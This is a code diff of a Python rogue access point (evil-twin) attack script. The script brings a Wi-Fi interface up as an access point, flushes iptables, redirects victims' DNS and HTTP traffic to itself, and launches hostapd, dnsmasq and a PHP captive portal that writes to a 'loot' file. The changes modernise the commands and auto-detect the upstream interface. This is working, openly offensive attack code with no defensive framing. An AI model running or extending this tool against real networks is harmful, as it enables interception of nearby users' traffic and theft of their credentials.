@@ -466,53 +466,65 @@ def start_attack():
     if os.path.exists(LOOT_FILE):
         os.remove(LOOT_FILE)
 
+    # Detect upstream (internet-facing) interface dynamically
+    upstream = subprocess.run(
+        "ip route | grep '^default' | awk '{print $5}'",
+        shell=True, capture_output=True, text=True
+    ).stdout.strip() or "eth0"
+
     try:
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True) # Removed check=True
-        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True) # Removed check=True
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True) # Removed check=True
-        
+        subprocess.run(f"ip link set {WIFI_INTERFACE} down", shell=True)
+        subprocess.run(f"iw dev {WIFI_INTERFACE} set type ap", shell=True)
+        subprocess.run(f"ip addr flush dev {WIFI_INTERFACE}", shell=True)
+        subprocess.run(f"ip addr add 10.0.0.1/24 dev {WIFI_INTERFACE}", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} up", shell=True)
+
         # Enable IP forwarding
         subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
-        
+
         # Setup iptables for NAT and DNS redirection
         subprocess.run("iptables -F", shell=True, check=True)
         subprocess.run("iptables -t nat -F", shell=True, check=True)
         subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True, check=True)
         subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True, check=True)
-        subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o eth0 -j ACCEPT", shell=True, check=True) # Assuming eth0 is internet-facing
-        subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True, check=True) # Assuming eth0 is internet-facing
+        subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o {upstream} -j ACCEPT", shell=True, check=True)
+        subprocess.run(f"iptables -t nat -A POSTROUTING -o {upstream} -j MASQUERADE", shell=True, check=True)
 
         cmd_hostapd = f"hostapd {hostapd_conf}"
-        attack_processes['hostapd'] = subprocess.Popen(cmd_hostapd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+        attack_processes['hostapd'] = subprocess.Popen(
+            cmd_hostapd, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
+            preexec_fn=os.setsid)
         time.sleep(2)
         if attack_processes['hostapd'].poll() is not None:
             error_msg = attack_processes['hostapd'].stderr.read().decode().strip()
-            print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"hostapd failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", f"hostapd: {error_msg[:50]}"], "red")
             return False
 
-        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf} -d"
-        attack_processes['dnsmasq'] = subprocess.Popen(cmd_dnsmasq, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-        time.sleep(2)
+        # dnsmasq without -d so it daemonises and doesn't block the pipe
+        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf}"
+        attack_processes['dnsmasq'] = subprocess.Popen(
+            cmd_dnsmasq, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid)
+        time.sleep(1)
         if attack_processes['dnsmasq'].poll() is not None:
-            error_msg = attack_processes['dnsmasq'].stderr.read().decode().strip()
-            print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"dnsmasq failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", "dnsmasq failed to start"], "red")
             return False
 
         cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
-        attack_processes['php'] = subprocess.Popen(cmd_php, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-        time.sleep(2)
+        attack_processes['php'] = subprocess.Popen(
+            cmd_php, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid)
+        time.sleep(1)
         if attack_processes['php'].poll() is not None:
-            error_msg = attack_processes['php'].stderr.read().decode().strip()
-            print(f"ERROR: PHP web server failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"PHP failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", "PHP server failed to start"], "red")
             return False
-        
+
         return True
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
-        print(f"Error starting attack services: {e}", file=sys.stderr)
-        draw_message(["ERROR:", f"Attack setup failed: {str(e)[:50]}..."], "red")
+        draw_message(["ERROR:", f"Setup failed: {str(e)[:50]}"], "red")
         return False
 
 def stop_attack():
@@ -532,9 +544,9 @@ def stop_attack():
 
     if ORIGINAL_WIFI_INTERFACE:
         draw_message(["Restoring NM..."], "yellow")
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
-        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed 2>/dev/null || true", shell=True)
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
+        subprocess.run(f"iw dev {WIFI_INTERFACE} set type managed 2>/dev/null || true", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
         time.sleep(1)
         
         subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
